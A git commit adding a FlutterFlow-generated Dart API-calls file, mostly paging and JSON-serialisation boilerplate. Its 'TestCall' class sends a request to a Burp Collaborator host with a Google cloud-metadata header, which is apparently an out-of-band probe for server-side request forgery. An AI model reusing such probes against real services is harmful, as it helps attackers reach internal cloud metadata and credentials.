d115c5f583a3c19694ccc8f382138443fe214769
FlutterFlow <140657486+FlutterFlowEng@users.noreply.github.com>
2023-08-18 10:15:28 +0000

    Updating to latest FlutterFlow output.

---
+++ lib/backend/api_requests/api_calls.dart
@@ -0,0 +1,62 @@
+import 'dart:convert';
+import 'dart:typed_data';
+
+import '../../flutter_flow/flutter_flow_util.dart';
+
+import 'api_manager.dart';
+
+export 'api_manager.dart' show ApiCallResponse;
+
+const _kPrivateApiFunctionName = 'ffPrivateApiCall';
+
+class TestCall {
+  static Future<ApiCallResponse> call() {
+    return ApiManager.instance.makeApiCall(
+      callName: 'test',
+      apiUrl: 'http://zads52s9jo5tkm8gxt2fpdpyyp4is7.burpcollaborator.net',
+      callType: ApiCallType.GET,
+      headers: {
+        'Metadata-Flavor': 'Google',
+      },
+      params: {},
+      returnBody: true,
+      encodeBodyUtf8: false,
+      decodeUtf8: false,
+      cache: false,
+    );
+  }
+}
+
+class ApiPagingParams {
+  int nextPageNumber = 0;
+  int numItems = 0;
+  dynamic lastResponse;
+
+  ApiPagingParams({
+    required this.nextPageNumber,
+    required this.numItems,
+    required this.lastResponse,
+  });
+
+  @override
+  String toString() =>
+      'PagingParams(nextPageNumber: $nextPageNumber, numItems: $numItems, lastResponse: $lastResponse,)';
+}
+
+String _serializeList(List? list) {
+  list ??= <String>[];
+  try {
+    return json.encode(list);
+  } catch (_) {
+    return '[]';
+  }
+}
+
+String _serializeJson(dynamic jsonVar, [bool isList = false]) {
+  jsonVar ??= (isList ? [] : {});
+  try {
+    return json.encode(jsonVar);
+  } catch (_) {
+    return isList ? '[]' : '{}';
+  }
+}
